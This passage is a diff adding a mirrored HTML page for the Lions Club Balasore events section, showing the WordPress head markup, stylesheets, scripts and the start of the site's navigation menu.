@@ -1,0 +1,675 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html dir="ltr" xmlns="http://www.w3.org/1999/xhtml">
+
+<!-- Mirrored from lionsclubbls.org/event/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 02 Jul 2026 08:52:00 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+<meta charset="utf-8">
+<title>Welcome to the Official Website of Lions Club Balasore   |  Events</title>
+<meta name="description" content=""/>
+<meta name="keywords" content=""/>
+<meta name="author" content="Infocreatives"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<link rel="stylesheet" type="text/css" href="../wp-content/themes/lionsclub/style.css" />
+
+<link rel="stylesheet" href="../../cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/assets/owl.carousel.min.css">
+<link rel="stylesheet" href="../../cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/assets/owl.theme.default.min.css">
+
+<script src="../../cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script src="../../cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/owl.carousel.min.js"></script>
+<link href="../wp-content/themes/lionsclub/assets/frontend/css/bootstrap.min.css" rel="stylesheet"/>
+<link href="../wp-content/themes/lionsclub/assets/frontend/css/fancybox/jquery.fancybox.css" rel="stylesheet">
+<link href="../wp-content/themes/lionsclub/assets/frontend/css/jcarousel.css" rel="stylesheet"/>
+<link href="../wp-content/themes/lionsclub/assets/frontend/css/flexslider.css" rel="stylesheet"/>
+<link href="../wp-content/themes/lionsclub/assets/frontend/css/style.css" rel="stylesheet"/>
+<link href="../wp-content/themes/lionsclub/assets/frontend/css/color.css" rel="stylesheet"/>
+<link href="../wp-content/themes/lionsclub/assets/frontend/css/colors.css" rel="stylesheet"/>
+<link href="../wp-content/themes/lionsclub/assets/frontend/css/lionsclub.css" rel="stylesheet"/>
+<link href="../wp-content/themes/lionsclub/assets/frontend/css/lcimenu.css" rel="stylesheet"/>
+<link href="../wp-content/themes/lionsclub/assets/frontend/css/lcifooter.css" rel="stylesheet"/>
+<link href="../wp-content/themes/lionsclub/assets/frontend/css/lcivideo.css" rel="stylesheet"/>
+<link href="../wp-content/themes/lionsclub/assets/frontend/css/lcicategory.css" rel="stylesheet"/>
+<link href="../wp-content/themes/lionsclub/assets/frontend/css/lcisitemap.css" rel="stylesheet"/>
+
+<link rel="stylesheet" href="../wp-content/themes/lionsclub/assets/frontend/js/owl-carousel/assets/owl.carousel.min.css">
+<link rel="stylesheet" href="../wp-content/themes/lionsclub/assets/frontend/js/owl-carousel/assets/owl.theme.default.min.css">
+<link href="../../unpkg.com/aos%402.3.1/dist/aos.css" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;500;600;700&amp;display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@200;300;400;500;600;700&amp;display=swap" rel="stylesheet">
+<link rel="alternate" type="application/rss+xml" title="RSS 2.0" href="../feed/index.php" />
+<link rel="alternate" type="text/xml" title="RSS .92" href="../feed/rss/index.php" />
+<link rel="alternate" type="application/atom+xml" title="Atom 1.0" href="../feed/atom/index.php" />
+<link rel="pingback" href="../xmlrpc.html" />
+<!-- Favicon and Touch Icons -->
+<link rel="shortcut icon" href="../wp-content/uploads/2025/08/lions-club-logo.png" type="image/png">
+<link rel="apple-touch-icon" href="../wp-content/uploads/2025/08/lions-club-logo.png" >
+<link rel="apple-touch-icon" href="../wp-content/uploads/2025/08/lions-club-logo.png" sizes="72x72">
+<link rel="apple-touch-icon" href="../wp-content/uploads/2025/08/lions-club-logo.png" sizes="114x114">
+<link rel="apple-touch-icon" href="../wp-content/uploads/2025/08/lions-club-logo.png" sizes="144x144">
+<!--Meta OG properties-->
+<meta property='og:title'  content="Welcome to the Official Website of Lions Club Balasore   |  Events"/>
+<meta property='og:image' content="https://lionsclubbls.org/wp-content/uploads/2025/08/lions-club-logo.png"/>
+<meta property="og:site_name" content="Lions Club Balasore">
+<meta property="og:description" content="Welcome to the Official Website of Lions Club Balasore   |  Events"/>
+<meta property="og:url" content="http://www.lionsclubbls.org"/>
+<meta property="og:type" content="website"/>
+<meta name='robots' content='max-image-preview:large' />
+<link rel='dns-prefetch' href='http://unpkg.com/' />
+<link rel='dns-prefetch' href='http://cdnjs.cloudflare.com/' />
+<link rel="alternate" type="application/rss+xml" title="Lions Club Balasore &raquo; Events Feed" href="feed/index.php" />
+<style id="wp-img-auto-sizes-contain-inline-css">
+img:is([sizes=auto i],[sizes^="auto," i]){contain-intrinsic-size:3000px 1500px}
+/*# sourceURL=wp-img-auto-sizes-contain-inline-css */
+</style>
+<style id="wp-emoji-styles-inline-css">
+
+	img.wp-smiley, img.emoji {
+		display: inline !important;
+		border: none !important;
+		box-shadow: none !important;
+		height: 1em !important;
+		width: 1em !important;
+		margin: 0 0.07em !important;
+		vertical-align: -0.1em !important;
+		background: none !important;
+		padding: 0 !important;
+	}
+/*# sourceURL=wp-emoji-styles-inline-css */
+</style>
+<style id="wp-block-library-inline-css">
+:root{--wp-block-synced-color:#7a00df;--wp-block-synced-color--rgb:122,0,223;--wp-bound-block-color:var(--wp-block-synced-color);--wp-editor-canvas-background:#ddd;--wp-admin-theme-color:#007cba;--wp-admin-theme-color--rgb:0,124,186;--wp-admin-theme-color-darker-10:#006ba1;--wp-admin-theme-color-darker-10--rgb:0,107,160.5;--wp-admin-theme-color-darker-20:#005a87;--wp-admin-theme-color-darker-20--rgb:0,90,135;--wp-admin-border-width-focus:2px}@media (min-resolution:192dpi){:root{--wp-admin-border-width-focus:1.5px}}.wp-element-button{cursor:pointer}:root .has-very-light-gray-background-color{background-color:#eee}:root .has-very-dark-gray-background-color{background-color:#313131}:root .has-very-light-gray-color{color:#eee}:root .has-very-dark-gray-color{color:#313131}:root .has-vivid-green-cyan-to-vivid-cyan-blue-gradient-background{background:linear-gradient(135deg,#00d084,#0693e3)}:root .has-purple-crush-gradient-background{background:linear-gradient(135deg,#34e2e4,#4721fb 50%,#ab1dfe)}:root .has-hazy-dawn-gradient-background{background:linear-gradient(135deg,#faaca8,#dad0ec)}:root .has-subdued-olive-gradient-background{background:linear-gradient(135deg,#fafae1,#67a671)}:root .has-atomic-cream-gradient-background{background:linear-gradient(135deg,#fdd79a,#004a59)}:root .has-nightshade-gradient-background{background:linear-gradient(135deg,#330968,#31cdcf)}:root .has-midnight-gradient-background{background:linear-gradient(135deg,#020381,#2874fc)}:root{--wp--preset--font-size--normal:16px;--wp--preset--font-size--huge:42px}.has-regular-font-size{font-size:1em}.has-larger-font-size{font-size:2.625em}.has-normal-font-size{font-size:var(--wp--preset--font-size--normal)}.has-huge-font-size{font-size:var(--wp--preset--font-size--huge)}:root .has-text-align-center{text-align:center}:root .has-text-align-left{text-align:left}:root .has-text-align-right{text-align:right}.has-fit-text{white-space:nowrap!important}#end-resizable-editor-section{display:none}.aligncenter{clear:both}.items-justified-left{justify-content:flex-start}.items-justified-center{justify-content:center}.items-justified-right{justify-content:flex-end}.items-justified-space-between{justify-content:space-between}.screen-reader-text{word-wrap:normal!important;border:0;clip-path:inset(50%);height:1px;margin:-1px;overflow:hidden;padding:0;position:absolute;width:1px}.screen-reader-text:focus{background-color:#ddd;clip-path:none;color:#444;display:block;font-size:1em;height:auto;left:5px;line-height:normal;padding:15px 23px 14px;text-decoration:none;top:5px;width:auto;z-index:100000}html :where(.has-border-color){border-style:solid}html :where([style*=border-color]){border-style:solid}html :where([style*=border-top-color]){border-top-style:solid}html :where([style*=border-right-color]){border-right-style:solid}html :where([style*=border-bottom-color]){border-bottom-style:solid}html :where([style*=border-left-color]){border-left-style:solid}html :where([style*=border-width]){border-style:solid}html :where([style*=border-top-width]){border-top-style:solid}html :where([style*=border-right-width]){border-right-style:solid}html :where([style*=border-bottom-width]){border-bottom-style:solid}html :where([style*=border-left-width]){border-left-style:solid}html :where(img[class*=wp-image-]){height:auto;max-width:100%}:where(figure){margin:0 0 1em}html :where(.is-position-sticky){--wp-admin--admin-bar--position-offset:var(--wp-admin--admin-bar--height,0px)}@media screen and (max-width:600px){html :where(.is-position-sticky){--wp-admin--admin-bar--position-offset:0px}}
+
+/*# sourceURL=/wp-includes/css/dist/block-library/common.min.css */
+</style>
+<style id="classic-theme-styles-inline-css">
+/*! This file is auto-generated */
+.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
+/*# sourceURL=/wp-includes/css/classic-themes.min.css */
+</style>
+
+<link rel='stylesheet' id='awsm-ead-public-css' href='../wp-content/plugins/embed-any-document/css/embed-public.min4537.css?ver=2.7.12' media='all' />
+<style id="global-styles-inline-css">
+:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgb(6,147,227) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgb(252,185,0) 0%,rgb(255,105,0) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgb(255,105,0) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgb(255, 255, 255), 6px 6px rgb(0, 0, 0);--wp--preset--shadow--crisp: 6px 6px 0px rgb(0, 0, 0);}:where(body) { margin: 0; }:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}body{padding-top: 0px;padding-right: 0px;padding-bottom: 0px;padding-left: 0px;}:root :where(.wp-element-button, .wp-block-button__link){background-color: #32373c;border-width: 0;color: #fff;font-family: inherit;font-size: inherit;font-style: inherit;font-weight: inherit;letter-spacing: inherit;line-height: inherit;padding-top: calc(0.667em + 2px);padding-right: calc(1.333em + 2px);padding-bottom: calc(0.667em + 2px);padding-left: calc(1.333em + 2px);text-decoration: none;text-transform: inherit;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
+/*# sourceURL=global-styles-inline-css */
+</style>
+
+<link rel='stylesheet' id='contact-form-7-css' href='../wp-content/plugins/contact-form-7/includes/css/stylesc098.css?ver=6.1.6' media='all' />
+<link rel='stylesheet' id='ispl-impacts-style-css' href='../wp-content/plugins/ispl-lions-impact/css/ispl-impacts8717.css?ver=7.0' media='all' />
+<link rel='stylesheet' id='ispl-projects-style-css' href='../wp-content/plugins/ispl-lions-project/css/ispl-projects8717.css?ver=7.0' media='all' />
+<link rel='stylesheet' id='ispl-gallery-style-css' href='../wp-content/plugins/ispl-photo-gallery/css/gallery8717.css?ver=7.0' media='all' />
+<link rel='stylesheet' id='ispl-lightbox-style-css' href='../../cdnjs.cloudflare.com/ajax/libs/lightbox2/2.11.3/css/lightbox.min8717.css?ver=7.0' media='all' />
+<link rel='stylesheet' id='rgg-simplelightbox-css' href='../wp-content/plugins/responsive-gallery-grid/lib/simplelightbox/simplelightbox.min7793.css?ver=2.4' media='all' />
+<link rel='stylesheet' id='slickstyle-css' href='../wp-content/plugins/responsive-gallery-grid/lib/slick/slick.1.9.0.min7793.css?ver=2.4' media='all' />
+<link rel='stylesheet' id='slick-theme-css' href='../wp-content/plugins/responsive-gallery-grid/lib/slick/slick-theme7793.css?ver=2.4' media='all' />
+<link rel='stylesheet' id='rgg-style-css' href='../wp-content/plugins/responsive-gallery-grid/css/style7793.css?ver=2.4' media='all' />
+<script id="jquery-core-js" src="../wp-includes/js/jquery/jquery.minf43b.js?ver=3.7.1"></script>
+<script id="jquery-migrate-js" src="../wp-includes/js/jquery/jquery-migrate.min5589.js?ver=3.4.1"></script>
+<link rel="https://api.w.org/" href="../wp-json/index.php" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="../xmlrpc0db0.html?rsd" />
+<meta name="generator" content="WordPress 7.0" />
+<link rel="icon" href="../wp-content/uploads/2025/08/cropped-lions-club-logo-32x32.png" sizes="32x32" />
+<link rel="icon" href="../wp-content/uploads/2025/08/cropped-lions-club-logo-192x192.png" sizes="192x192" />
+<link rel="apple-touch-icon" href="../wp-content/uploads/2025/08/cropped-lions-club-logo-180x180.png" />
+<meta name="msapplication-TileImage" content="https://lionsclubbls.org/wp-content/uploads/2025/08/cropped-lions-club-logo-270x270.png" />
+</head>
+<body class="js " style="  ">
+    <div id="wrapper">
+        <!-- start header -->
+        <header>
+        <!-- top header starts here -->
+        <!--top header ends here----------------------------------------------->
+        <!--HEADER NAVIGATION MENU STARTS-->				
+    <div class="navbar">
+        <div  id ="navbars"class=" navbar-fixed-top navbar-default">
+            <div class="container-fluid padding-zero ">
+                <div class="navbar-header ">
+                <button type="button" class="navbar-toggle" id="toggle-icon" data-toggle="collapse" data-target=".navbar-collapse">
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                </button>
+                <a class="navbar-brand" href="../index.php">
+                    <img alt="" src="../wp-content/uploads/2025/08/lions-club-logo.png">
+                </a>
+            </div>
+                <div class="navbar-collapse collapse" id="hide-div">
+                    <ul id="menu-header-menu" class="menu"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home menu-item-86"><a href="../index.php">Home</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-115"><a href="#">About Us</a>
+<ul class="sub-menu">
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-87"><a href="../about-us/index.php">About Us</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-362"><a href="../50-years-golden-jubilee-of-the-club/index.php">50 years (Golden jubilee ) of the club</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-114"><a href="../our-founder/index.php">Our Founder</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-192"><a href="../our-core-values/index.php">Our Core Values</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-117"><a href="https://www.lionsclubs.org/en">Lions International</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-121"><a href="../lci-historical-highlights/index.php">LCI Historical Highlights</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-178"><a href="../clubs-sponsored-by-us/index.php">Clubs Sponsored by us</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-206"><a href="../our-leaders/index.php">Our Leaders</a>
+<ul class="sub-menu">
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-442"><a href="../our-president/index.php">Our President</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-448"><a href="../name-of-charter-members/index.php">Name of Charter Members</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-483"><a href="#">Our Members</a>
+<ul class="sub-menu">
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-252"><a href="../our-members/index.php">Our Members</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-451"><a href="../member-more-than-25-years/index.php">Member more than 25 Years</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-294"><a href="../five-benefits-of-being-a-lion/index.php">Five Benefits of Being a Lion</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-288"><a href="../join-now/index.php">Join Now</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-255"><a href="#">Our Works</a>
+<ul class="sub-menu">
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-247"><a href="../our-causes/index.php">Our Causes</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-246"><a href="../our-impacts/index.php">Our Impacts</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-245"><a href="../our-projects/index.php">Our Projects</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-254"><a href="#">Gallery</a>
+<ul class="sub-menu">
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-263"><a href="../photo-gallery/index.php">Photo gallery</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-262"><a href="../video-gallery/index.php">Video Gallery</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-267"><a href="#">Events</a>
+<ul class="sub-menu">
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-88"><a href="../our-events/index.php">Our Events</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-268"><a href="../our-meetings/index.php">Our Meetings</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-336"><a href="../our-downloads/index.php">Downloads</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-244"><a href="../contact-us/index.php">Contact Us</a></li>
+<li class="menu-item donate-li">
+                <button class="nav-donate-btn">
+                    <a href="../donate-us/index.php">Donate</a>
+                </button>
+            </li></ul>                
+                </div>
+                <div id="show-div">
+                    <div class="sidemenu-sec" style="display: none;">
+                        <aside class="sidebar side-nav leftside-bar">
+                            <div id="leftside-navigation">
+                            <ul id="menu-header-menu-1" class="level-0"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home menu-item-86"><a href="../index.php">Home</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-115 parent"><a href="#" class="dropdown-toggle" data-toggle="dropdown" data-hover="dropdown" data-delay="0" data-close-others="true">About Us <i class="arrow fa fa-angle-right"></i></a>
+<ul class="sub-menu">
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-87"><a href="../about-us/index.php">About Us</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-362"><a href="../50-years-golden-jubilee-of-the-club/index.php">50 years (Golden jubilee ) of the club</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-114"><a href="../our-founder/index.php">Our Founder</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-192"><a href="../our-core-values/index.php">Our Core Values</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-117"><a href="https://www.lionsclubs.org/en">Lions International</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-121"><a href="../lci-historical-highlights/index.php">LCI Historical Highlights</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-178"><a href="../clubs-sponsored-by-us/index.php">Clubs Sponsored by us</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-206 parent"><a href="../our-leaders/index.php" class="dropdown-toggle" data-toggle="dropdown" data-hover="dropdown" data-delay="0" data-close-others="true">Our Leaders <i class="arrow fa fa-angle-right"></i></a>
+<ul class="sub-menu">
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-442"><a href="../our-president/index.php">Our President</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-448"><a href="../name-of-charter-members/index.php">Name of Charter Members</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-483 parent"><a href="#" class="dropdown-toggle" data-toggle="dropdown" data-hover="dropdown" data-delay="0" data-close-others="true">Our Members <i class="arrow fa fa-angle-right"></i></a>
+<ul class="sub-menu">
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-252"><a href="../our-members/index.php">Our Members</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-451"><a href="../member-more-than-25-years/index.php">Member more than 25 Years</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-294"><a href="../five-benefits-of-being-a-lion/index.php">Five Benefits of Being a Lion</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-288"><a href="../join-now/index.php">Join Now</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-255 parent"><a href="#" class="dropdown-toggle" data-toggle="dropdown" data-hover="dropdown" data-delay="0" data-close-others="true">Our Works <i class="arrow fa fa-angle-right"></i></a>
+<ul class="sub-menu">
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-247"><a href="../our-causes/index.php">Our Causes</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-246"><a href="../our-impacts/index.php">Our Impacts</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-245"><a href="../our-projects/index.php">Our Projects</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-254 parent"><a href="#" class="dropdown-toggle" data-toggle="dropdown" data-hover="dropdown" data-delay="0" data-close-others="true">Gallery <i class="arrow fa fa-angle-right"></i></a>
+<ul class="sub-menu">
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-263"><a href="../photo-gallery/index.php">Photo gallery</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-262"><a href="../video-gallery/index.php">Video Gallery</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-267 parent"><a href="#" class="dropdown-toggle" data-toggle="dropdown" data-hover="dropdown" data-delay="0" data-close-others="true">Events <i class="arrow fa fa-angle-right"></i></a>
+<ul class="sub-menu">
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-88"><a href="../our-events/index.php">Our Events</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-268"><a href="../our-meetings/index.php">Our Meetings</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-336"><a href="../our-downloads/index.php">Downloads</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-244"><a href="../contact-us/index.php">Contact Us</a></li>
+<li class="menu-item donate-li">
